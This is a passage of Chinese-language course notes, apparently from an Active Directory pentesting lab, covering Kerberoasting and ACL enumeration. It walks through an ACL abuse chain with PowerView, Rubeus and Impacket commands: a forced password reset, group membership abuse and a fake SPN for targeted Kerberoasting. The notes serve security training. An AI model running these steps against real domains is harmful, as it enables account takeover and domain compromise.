DEF4CCCD234CFD418437601FA5049F669FEFD07087606BAE01D88137C994E228796A55675520AB252E900C4269B0CCA3ACE8790407980723D8570F244FE01885B471BF5AC3E3626A357D9FF252FF2635567B49E838D34E0169BDD4D3565534197C40072074ACA51DB81B71E31192DB29A710412B859FA55C0F41928529F27A6E67E19BE8A6864F4BC456D3856327A269EF0D1E9B79457E63D0CCFB5862B23037C74B021A0CDCA80B43024A4C89C8B1C622A626DE5FB1F99C9B41749DDAA0B6DF9917E8F7ABDA731044CF0E989A4A062319784D11E2B43554E329887BF7B3AD1F3A10158659BF48F9D364D55F2C8B19408C54737AB1A6DFE92C2BAEA9E</span></span><br></pre></td></tr></table></figure><h4 id="request-ticket"><a href="#request-ticket" class="headerlink" title="request ticket"></a>request ticket</h4><p><code>/tgtdeleg</code> 指定在请求新服务票证时使用 RC4 加密</p><p>Rubeus 通过在 TGS 请求正文中指定 RC4 加密作为机器支持的唯一算法来实现这一点。这可能是 Active Directory 内置的故障保护，用于向后兼容。通过使用此标志，可以请求可以更快破解的 RC4（类型 23）加密票证。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt;  .\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729224185247.png" alt="kerb_tgs_18"></p><blockquote><p><strong>注意</strong>：</p><p>无论域功能级别如何，这都不适用于 Windows Server 2019 域控制器。它将始终返回使用目标帐户支持的最高加密级别加密的服务票证。</p><p>如果发现攻击所在的域中的域控制器运行在 Server 2016 或更早版本上（这很常见），启用 AES 不会通过仅返回 AES 加密票证（这更难破解）来部分缓解 Kerberoasting，而是会允许攻击者请求 RC4 加密的服务票证。</p><p>在 Windows Server 2019 DC 中，在 SPN 帐户上启用 AES 加密将导致收到 AES-256（类型 18）服务票证，这更难（但并非不可能）破解，尤其是在使用相对较弱的字典密码的情况下。</p></blockquote><hr><h1 id="ACL-Enumeration"><a href="#ACL-Enumeration" class="headerlink" title="ACL Enumeration"></a>ACL Enumeration</h1><p>ACL 中的设置本身称为<code>Access Control Entries</code>( <code>ACEs</code>)。每个 ACE 都映射回用户、组或进程（也称为安全主体），并定义授予该主体的权限。每个对象都有一个 ACL，可以有多个 ACE，因为多个安全主体可以访问 AD 中的对象。ACL 还可用于审核 AD 中的访问。</p><p>两种类型的 ACL：</p><ol><li><code>Discretionary Access Control List</code>( <code>DACL</code>) - 定义哪些安全主体被授予或拒绝访问对象。DACL 由允许或拒绝访问的 ACE 组成。当有人试图访问对象时，系统将检查 DACL 以了解允许的访问级别。如果某个对象不存在 DACL，则所有试图访问该对象的人都将被授予完全权限。如果 DACL 存在，但没有任何指定特定安全设置的 ACE 条目，则系统将拒绝所有试图访问该对象的用户、组或进程的访问。</li><li><code>System Access Control Lists</code>（<code>SACL</code>）- 允许管理员记录对安全对象的访问尝试。</li></ol><p>三种主要类型的 ACE 可应用于 AD 中的所有可安全对象：</p><table><thead><tr><th>ACE</th><th>Describe</th></tr></thead><tbody><tr><td><code>Access denied ACE</code></td><td>在 DACL 中用于表明明确拒绝用户或组访问某个对象</td></tr><tr><td><code>Access allowed ACE</code></td><td>在 DACL 中使用，表明用户或组被明确授予对某个对象的访问权限</td></tr><tr><td><code>System audit ACE</code></td><td>在 SACL 中用于在用户或组尝试访问对象时生成审计日志。它记录是否授予访问权限以及发生了哪种类型的访问</td></tr></tbody></table><p>每个 ACE 都有4个组件组成：</p><ol><li>有权访问该对象的用户&#x2F;组的安全标识符 (SID)（或以图形方式表示的主体名称）</li><li>表示 ACE 类型的标志（拒绝访问、允许访问或系统审计 ACE）</li><li>一组标志，指定子容器&#x2F;对象是否可以从主对象或父对象继承给定的 ACE 条目</li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN">访问掩码</a>是一个 32 位值，用于定义授予对象的权限</li></ol><p>ACL 攻击的威力：</p><ul><li><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#forcechangepassword">ForceChangePassword</a> - 赋予在不知道用户密码的情况下重置用户密码的权利（应谨慎使用，最好在重置密码之前咨询客户）。</li><li><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite">GenericWrite</a> - 赋予写入对象任何不受保护属性的权限。如果对用户拥有此访问权限，可以为他们分配 SPN 并执行 Kerberoasting 攻击（这依赖于目标帐户设置了弱密码）。对组而言，这意味着可以将自己或其他安全主体添加到给定组。最后，如果对计算机对象拥有此访问权限，可以执行基于资源的约束委派攻击。</li><li><code>AddSelf</code>- 显示用户可以将自己添加到的安全组。</li><li><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall">GenericAll</a> - 这授予目标对象的完全控制权。同样，根据是否授予用户或组此权限，可以修改组成员身份、强制更改密码或执行有针对性的 Kerberoasting 攻击。如果对计算机对象具有此访问权限，并且环境中正在使用<a href="https://www.microsoft.com/en-us/download/details.aspx?id=46899">本地管理员密码解决方案 (LAPS)</a>，可以读取 LAPS 密码并获得对计算机的本地管理员访问权限，如果可以获得特权控制或获得某种特权访问权限。</li></ul><p><a href="https://twitter.com/_nwodtuhs">此图改编自Charlie Bromberg (Shutdown)</a>制作的一张图，它很好地分解了各种可能的 ACE 攻击以及从 Windows 和 Linux（如果适用）执行这些攻击的工具。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729225499212.png" alt="ACL_attacks_graphic"></p><h2 id="PowerView-2"><a href="#PowerView-2" class="headerlink" title="PowerView"></a>PowerView</h2><p>PowerView 枚举 ACL，枚举所有结果的任务将非常耗时，而且可能不准确。</p><h3 id="Find-InterestingDomainAcl"><a href="#Find-InterestingDomainAcl" class="headerlink" title="Find-InterestingDomainAcl"></a>Find-InterestingDomainAcl</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Find-InterestingDomainAcl</span></span><br><span class="line"></span><br><span class="line">ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">AceQualifier            : AccessAllowed</span><br><span class="line">ActiveDirectoryRights   : ExtendedRight</span><br><span class="line">ObjectAceType           : ab721a53<span class="literal">-1e2f-11d0-9819-00aa0040529b</span></span><br><span class="line">AceFlags                : ContainerInherit</span><br><span class="line">AceType                 : AccessAllowedObject</span><br><span class="line">InheritanceFlags        : ContainerInherit</span><br><span class="line">SecurityIdentifier      : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5189</span></span><br><span class="line">IdentityReferenceName   : Exchange Windows Permissions</span><br><span class="line">IdentityReferenceDomain : INLANEFREIGHT.LOCAL</span><br><span class="line">IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security </span><br><span class="line">                          Groups,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">IdentityReferenceClass  : <span class="built_in">group</span></span><br><span class="line"></span><br><span class="line">ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">AceQualifier            : AccessAllowed</span><br><span class="line">ActiveDirectoryRights   : ExtendedRight</span><br><span class="line">ObjectAceType           : <span class="number">00299570</span><span class="literal">-246d-11d0-a768-00aa006e0529</span></span><br><span class="line">AceFlags                : ContainerInherit</span><br><span class="line">AceType                 : AccessAllowedObject</span><br><span class="line">InheritanceFlags        : ContainerInherit</span><br><span class="line">SecurityIdentifier      : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5189</span></span><br><span class="line">IdentityReferenceName   : Exchange Windows Permissions</span><br><span class="line">IdentityReferenceDomain : INLANEFREIGHT.LOCAL</span><br><span class="line">IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security </span><br><span class="line">                          Groups,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">IdentityReferenceClass  : <span class="built_in">group</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h3 id="Get-DomainObjectACL"><a href="#Get-DomainObjectACL" class="headerlink" title="Get-DomainObjectACL"></a>Get-DomainObjectACL</h3><p>针对单个用户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$sid</span> = <span class="built_in">Convert-NameToSid</span> wley</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainObjectACL</span> <span class="literal">-ResolveGUIDs</span> <span class="literal">-Identity</span> * | ? &#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> <span class="variable">$sid</span>&#125; </span><br><span class="line"></span><br><span class="line">AceQualifier           : AccessAllowed</span><br><span class="line">ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights  : ExtendedRight</span><br><span class="line">ObjectAceType          : User<span class="literal">-Force-Change-Password</span></span><br><span class="line">ObjectSID              : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1176</span></span><br><span class="line">InheritanceFlags       : ContainerInherit</span><br><span class="line">BinaryLength           : <span class="number">56</span></span><br><span class="line">AceType                : AccessAllowedObject</span><br><span class="line">ObjectAceFlags         : ObjectAceTypePresent</span><br><span class="line">IsCallback             : False</span><br><span class="line">PropagationFlags       : None</span><br><span class="line">SecurityIdentifier     : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1181</span></span><br><span class="line">AccessMask             : <span class="number">256</span></span><br><span class="line">AuditFlags             : None</span><br><span class="line">IsInherited            : False</span><br><span class="line">AceFlags               : ContainerInherit</span><br><span class="line">InheritedObjectAceType : All</span><br><span class="line">OpaqueLength           : <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="Get-Acl-Get-ADUser"><a href="#Get-Acl-Get-ADUser" class="headerlink" title="Get-Acl &amp; Get-ADUser"></a>Get-Acl &amp; Get-ADUser</h2><p>此示例效率不高，并且该命令可能需要很长时间才能运行，尤其是在大型环境中。它将比使用 PowerView 的等效命令花费更长的时间。</p><h3 id="enum-ACLs"><a href="#enum-ACLs" class="headerlink" title="enum ACLs"></a>enum ACLs</h3><p>列出域用户，导入 ad_users.txt</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> * | <span class="built_in">Select-Object</span> <span class="literal">-ExpandProperty</span> SamAccountName &gt; ad_users.txt</span><br></pre></td></tr></table></figure><p>然后，用 foreach 循环读取文件的每一行，并使用 Get-Acl cmdlet 检索每个域用户的 ACL 信息，方法是将 ad_users.txt 文件的每一行提供给 Get-ADUser cmdlet。只选择 Access 属性，它将为提供有关访问权限的信息。将 IdentityReference 属性设置为控制的用户（或查看他们拥有哪些权限）。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="keyword">foreach</span>(<span class="variable">$line</span> <span class="keyword">in</span> [<span class="type">System.IO.File</span>]::ReadLines(<span class="string">&quot;C:\Users\-student\Desktop\ad_users.txt&quot;</span>)) &#123;<span class="built_in">get-acl</span>  <span class="string">&quot;AD:\<span class="variable">$</span>(Get-ADUser <span class="variable">$line</span>)&quot;</span> | <span class="built_in">Select-Object</span> Path <span class="literal">-ExpandProperty</span> Access | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.IdentityReference <span class="operator">-match</span> <span class="string">&#x27;INLANEFREIGHT\\wley&#x27;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">Path                  : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dana </span><br><span class="line">                        Amundsen,OU=DevOps,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">InheritanceType       : All</span><br><span class="line">ObjectType            : <span class="number">00299570</span><span class="literal">-246d-11d0-a768-00aa006e0529</span></span><br><span class="line">InheritedObjectType   : <span class="number">00000000</span><span class="literal">-0000-0000-0000-000000000000</span></span><br><span class="line">ObjectFlags           : ObjectAceTypePresent</span><br><span class="line">AccessControlType     : Allow</span><br><span class="line">IdentityReference     : INLANEFREIGHT\wley</span><br><span class="line">IsInherited           : False</span><br><span class="line">InheritanceFlags      : ContainerInherit</span><br><span class="line">PropagationFlags      : None</span><br></pre></td></tr></table></figure><p>反向搜索并映射到 GUID 值 <code>User-Force-Change-Password</code>，或 Google 搜索 <code>00299570-246d-11d0-a768-00aa006e0529</code>。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$guid</span>= <span class="string">&quot;00299570-246d-11d0-a768-00aa006e0529&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADObject</span> <span class="literal">-SearchBase</span> <span class="string">&quot;CN=Extended-Rights,<span class="variable">$</span>((Get-ADRootDSE).ConfigurationNamingContext)&quot;</span> <span class="literal">-Filter</span> &#123;ObjectClass <span class="operator">-like</span> <span class="string">&#x27;ControlAccessRight&#x27;</span>&#125; <span class="literal">-Properties</span> * |<span class="built_in">Select</span> Name,DisplayName,DistinguishedName,rightsGuid| ?&#123;<span class="variable">$_</span>.rightsGuid <span class="operator">-eq</span> <span class="variable">$guid</span>&#125; | <span class="built_in">fl</span></span><br><span class="line"></span><br><span class="line">Name              : User<span class="literal">-Force-Change-Password</span></span><br><span class="line">DisplayName       : Reset Password</span><br><span class="line">DistinguishedName : CN=User<span class="literal">-Force-Change-Password</span>,CN=Extended<span class="literal">-Rights</span>,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">rightsGuid        : <span class="number">00299570</span><span class="literal">-246d-11d0-a768-00aa006e0529</span></span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password">User-Force-Change-Password extended right</a>，显示用户有权强制更改其他用户的密码。</p><h2 id="BloodHound-1"><a href="#BloodHound-1" class="headerlink" title="BloodHound"></a>BloodHound</h2><p>将 wley 用户设置为起始节点，选择<code>Node Info</code>选项卡并向下滚动到<code>Outbound Control Rights</code>。此选项将显示通过组成员身份直接控制的对象，以及用户可以通过 ACL 攻击路径在<code>Transitive Object Control</code>下控制的对象数量。如果单击<code>First Degree Object Control</code>旁边的 <code>1</code>，将看到枚举的第一组权限，即 <code>damundsen</code> 用户的 <code>ForceChangePassword</code>。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729229524943.png" alt="wley_damundsen"></p><p>如果点击<code>16</code>旁边的<code>Transitive Object Control</code>，将看到上面精心列举的整个路径。从这里，可以利用每个边缘的帮助菜单来找到最佳的攻击方法。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729229648043.png" alt="wley_path"></p><hr><h1 id="ACL-Abuse"><a href="#ACL-Abuse" class="headerlink" title="ACL Abuse"></a>ACL Abuse</h1><p>启动攻击链，从而控制可以执行 DCSync 攻击的 adunn 用户，这将使能够检索域中所有用户的 NTLM 密码哈希，从而让完全控制域，并将权限升级到域&#x2F;企业管理员，甚至实现持久性，从而使完全控制域。要执行攻击链，必须执行以下操作：</p><ol><li>使用<code>wley</code>用户更改<code>damundsen</code>用户的密码</li><li>以<code>damundsen</code>用户身份进行身份验证并利用<code>GenericAll</code>权限将控制的用户添加到<code>Help Desk Level 1</code>组中</li><li>利用<code>Information Technology</code>组中嵌套的组成员身份并利用<code>GenericAll</code>权限来控制<code>adunn</code>用户</li></ol><h2 id="ForceChangePassword"><a href="#ForceChangePassword" class="headerlink" title="ForceChangePassword"></a>ForceChangePassword</h2><p>以<code>wley</code>用户的身份进行身份验证并强制更改其密码<code>damundsen</code>。可以先打开 PowerShell 控制台并以<code>wley</code>用户身份进行身份验证。</p><p>首先，创建一个<a href="https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0">PSCredential 对象</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;transporter@4&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;INLANEFREIGHT\wley&#x27;</span>, <span class="variable">$SecPassword</span>) </span><br></pre></td></tr></table></figure><p>接下来，创建一个<a href="https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0">SecureString 对象</a>，是为目标用户<code>damundsen</code>设置的密码。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$damundsenPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;Pwn3d_by_ACLs!&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure><p>最后，使用 PowerView 的 <a href="https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/">Set-DomainUserPassword</a> 函数来更改用户的密码。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Set-DomainUserPassword</span> <span class="literal">-Identity</span> damundsen <span class="literal">-AccountPassword</span> <span class="variable">$damundsenPassword</span> <span class="literal">-Credential</span> <span class="variable">$Cred</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">VERBOSE: [<span class="built_in">Get-PrincipalContext</span>] <span class="keyword">Using</span> alternate credentials</span><br><span class="line">VERBOSE: [<span class="built_in">Set-DomainUserPassword</span>] Attempting to <span class="built_in">set</span> the password <span class="keyword">for</span> user <span class="string">&#x27;damundsen&#x27;</span></span><br><span class="line">VERBOSE: [<span class="built_in">Set-DomainUserPassword</span>] Password <span class="keyword">for</span> user <span class="string">&#x27;damundsen&#x27;</span> successfully reset</span><br></pre></td></tr></table></figure><h2 id="GenericAll"><a href="#GenericAll" class="headerlink" title="GenericAll"></a>GenericAll</h2><p>将 <code>damundsen</code> 添加到 <code>Help Desk Level 1</code> 组。</p><p>创建 SecureString 对象</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;Pwn3d_by_ACLs!&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$Cred2</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;INLANEFREIGHT\damundsen&#x27;</span>, <span class="variable">$SecPassword</span>) </span><br></pre></td></tr></table></figure><p>PowerView 将 damundsen 添加到 Help Desk Level 1 组</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Add-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&#x27;Help Desk Level 1&#x27;</span> <span class="literal">-Members</span> <span class="string">&#x27;damundsen&#x27;</span> <span class="literal">-Credential</span> <span class="variable">$Cred2</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">VERBOSE: [<span class="built_in">Get-PrincipalContext</span>] <span class="keyword">Using</span> alternate credentials</span><br><span class="line">VERBOSE: [<span class="built_in">Add-DomainGroupMember</span>] Adding member <span class="string">&#x27;damundsen&#x27;</span> to <span class="built_in">group</span> <span class="string">&#x27;Help Desk Level 1&#x27;</span></span><br></pre></td></tr></table></figure><p>确认 damundsen 已添加到群组</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Help Desk Level 1&quot;</span> | <span class="built_in">Select</span> MemberName</span><br><span class="line"></span><br><span class="line">MemberName</span><br><span class="line"><span class="literal">----------</span></span><br><span class="line">busucher</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">damundsen</span><br></pre></td></tr></table></figure><h2 id="Creating-a-Fake-SPN"><a href="#Creating-a-Fake-SPN" class="headerlink" title="Creating a Fake SPN"></a>Creating a Fake SPN</h2><p>假设允许更改<code>damundsen</code>用户的密码，但该<code>adunn</code>用户是无法中断的管理员帐户。由于拥有<code>GenericAll</code>此帐户的权限，所以可以进行更多的尝试，并通过修改帐户的<a href="https://docs.microsoft.com/en-us/windows/win32/adschema/a-serviceprincipalname">servicePrincipalName 属性</a>来创建伪造的 SPN，从而执行有针对性的 Kerberoasting 攻击，然后可以对其进行 Kerberoast 以获取 TGS 票证并使用 Hashcat 离线破解哈希。</p><p>必须以组成员的身份进行身份验证<code>Information Technology</code>才能成功。由于将<code>damundsen</code>加入了<code>Help Desk Level 1</code>组，因此通过嵌套组成员身份继承了权限。现在可以使用<a href="https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/">Set-DomainObject</a>创建伪造的 SPN。可以使用<a href="https://github.com/ShutdownRepo/targetedKerberoast">targetKerberoast</a>工具从 Linux 主机执行相同的攻击，它将在一个命令中创建临时 SPN、检索哈希并删除临时 SPN。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;Pwn3d_by_ACLs!&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$Cred2</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;INLANEFREIGHT\damundsen&#x27;</span>, <span class="variable">$SecPassword</span>) </span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-DomainObject</span> <span class="literal">-Credential</span> <span class="variable">$Cred2</span> <span class="literal">-Identity</span> adunn <span class="literal">-SET</span> <span class="selector-tag">@</span>&#123;serviceprincipalname=<span class="string">&#x27;notahacker/LEGIT&#x27;</span>&#125; <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">VERBOSE: [<span class="built_in">Get-Domain</span>] <span class="keyword">Using</span> alternate credentials for Get-Domain</span><br><span class="line">VERBOSE: [<span class="built_in">Get-Domain</span>] Extracted domain <span class="string">&#x27;INLANEFREIGHT&#x27;</span> from <span class="literal">-Credential</span></span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainSearcher</span>] search base: LDAP://ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainSearcher</span>] <span class="keyword">Using</span> alternate credentials for LDAP connection</span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainObject</span>] <span class="built_in">Get-DomainObject</span> <span class="keyword">filter</span> string:</span><br><span class="line">(&amp;(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))</span><br><span class="line">VERBOSE: [<span class="built_in">Set-DomainObject</span>] Setting <span class="string">&#x27;serviceprincipalname&#x27;</span> to <span class="string">&#x27;notahacker/LEGIT&#x27;</span> <span class="keyword">for</span> object <span class="string">&#x27;adunn&#x27;</span></span><br></pre></td></tr></table></figure><p>如果此方法有效，应该能够使用各种方法来对用户进行 Kerberoast 攻击，并获取用于离线破解的哈希值。</p><h3 id="kerberoasting"><a href="#kerberoasting" class="headerlink" title="kerberoasting"></a>kerberoasting</h3><h4 id="Impacket-GetUserSPNs"><a href="#Impacket-GetUserSPNs" class="headerlink" title="Impacket GetUserSPNs"></a>Impacket GetUserSPNs</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/damundsen -request-user adunn</span><br></pre></td></tr></table></figure><h4 id="Rubeus-1"><a href="#Rubeus-1" class="headerlink" title="Rubeus"></a>Rubeus</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe kerberoast /user:adunn /nowrap</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line">[*] NOTICE: AES hashes will be returned <span class="keyword">for</span> AES<span class="literal">-enabled</span> accounts.</span><br><span class="line">[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="keyword">for</span> these accounts.</span><br><span class="line"></span><br><span class="line">[*] Target User            : adunn</span><br><span class="line">[*] Target Domain          : INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] Total kerberoastable users : <span 